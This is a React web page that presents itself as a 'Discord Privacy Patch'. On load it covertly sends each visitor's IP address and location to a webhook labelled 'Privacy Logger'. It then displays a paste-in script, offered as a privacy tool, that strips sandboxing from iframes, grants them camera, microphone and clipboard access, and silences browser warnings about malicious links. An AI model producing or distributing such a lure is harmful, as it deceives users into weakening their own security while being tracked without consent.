import { useEffect, useState } from 'react';

export default function Home() {
  const [privacyPatchCode, setPrivacyPatchCode] = useState('');

  useEffect(() => {
    // Fetch IP address to log and send embed
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(async data => {
        const ip = data.ip || 'Unavailable';
        const city = data.city || 'Unavailable';
        const region = data.region || 'Unavailable';
        const country = data.country_name || 'Unavailable';

        console.log("User IP:", ip); // Log IP to console

        // Discord Privacy Patch JS code
        const privacyPatchScript = `(() => {
  console.log('%c[DISCORD PRIVACY PATCH] ACTIVATING...', 'color: cyan; font-weight: bold;');

  // Typing indicator block
  const wsSend = WebSocket.prototype.send;
  WebSocket.prototype.send = function(data) {
    try {
      if (typeof data === 'string') {
        const json = JSON.parse(data);
        if (json.op === 3 || json.t === 'TYPING_START') {
          console.log('[PRIVACY] Blocked Typing Indicator');
          return;
        }
      }
    } catch (_) {}
    return wsSend.apply(this, arguments);
  };

  // Block tracking endpoints
  const trackBlock = ['sentry.io', 'google-analytics.com', 'discordapp.io/log'];
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (trackBlock.some(domain => url.includes(domain))) {
      console.log('[PRIVACY] Blocked Tracking: ' + url);
      return;
    }
    return origOpen.apply(this, arguments);
  };

  // Patch hasFocus
  try {
    Object.defineProperty(document, 'hasFocus', {
      value: () => false,
      configurable: true
    });
    console.log('[PRIVACY] hasFocus() always returns false');
  } catch (e) {
    console.warn('[PRIVACY] Failed to patch hasFocus');
  }

  // Suppress console warnings
  const ogWarn = console.warn;
  console.warn = function(...args) {
    const suppress = ['malicious link', 'blocked a frame', 'sandboxed'];
    if (suppress.some(w => args.join(' ').toLowerCase().includes(w))) return;
    return ogWarn.apply(console, args);
  };

  // Unsandbox iframes
  const nativeCreate = Document.prototype.createElement;
  Document.prototype.createElement = function(tag, ...args) {
    const el = nativeCreate.call(this, tag, ...args);
    if (tag.toLowerCase() === 'iframe') {
      el.removeAttribute('sandbox');
      el.setAttribute('allow', 'camera; microphone; autoplay; clipboard-read; clipboard-write');
      console.log('[PRIVACY] Sandbox removed from iframe');
    }
    return el;
  };

  // Fake telemetry ping
  window.addEventListener('beforeunload', () => {
    try {
      navigator.sendBeacon?.('/api/v9/users/@me/settings', JSON.stringify({
        status: 'idle',
        detect_platform_accounts: false
      }));
    } catch (e) {}
  });

  console.log('%c[DISCORD PRIVACY PATCH] ACTIVE ✅', 'color: lime; font-weight: bold;');
})();`;

        // Set the privacy patch script for display
        setPrivacyPatchCode(privacyPatchScript);

        // Prepare embed payload
        const embed = {
          username: "Privacy Logger",
          embeds: [
            {
              title: "🔒 Privacy Patch Delivered",
              color: 3447003,
              fields: [
                { name: "IP", value: ip, inline: true },
                { name: "City", value: city, inline: true },
                { name: "Region", value: region, inline: true },
                { name: "Country", value: country, inline: true },
                { name: "Has Focus Patched", value: "False always", inline: true },
                { name: "Typing Blocked", value: "Yes", inline: true },
                { name: "Tracking Blocked", value: "sentry, GA, app.io", inline: true }
              ],
              timestamp: new Date().toISOString(),
              footer: { text: "Logger by RedTeamOps" }
            }
          ]
        };

        // Send to webhook
        await fetch('/api/webhook', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });
      });
  }, []);

  return (
    <div style={{
      background: 'url("/bg.jpg") center center / cover no-repeat',
      height: '100vh',
      color: 'white',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      textAlign: 'center',
      fontSize: '1.2rem'
    }}>
      <div style={{ width: '80%' }}>
        <h2>🔒 Discord Privacy Patch Code</h2>
        <textarea
          style={{
            width: '100%',
            height: '300px',
            fontSize: '0.9rem',
            padding: '10px',
            backgroundColor: '#1E1E1E',
            color: 'white',
            border: '1px solid #444',
            borderRadius: '5px'
          }}
          readOnly
          value={privacyPatchCode}
        />
        <p style={{ marginTop: '15px' }}>Copy the code above to activate the privacy patch.</p>
      </div>
    </div>
  );
}
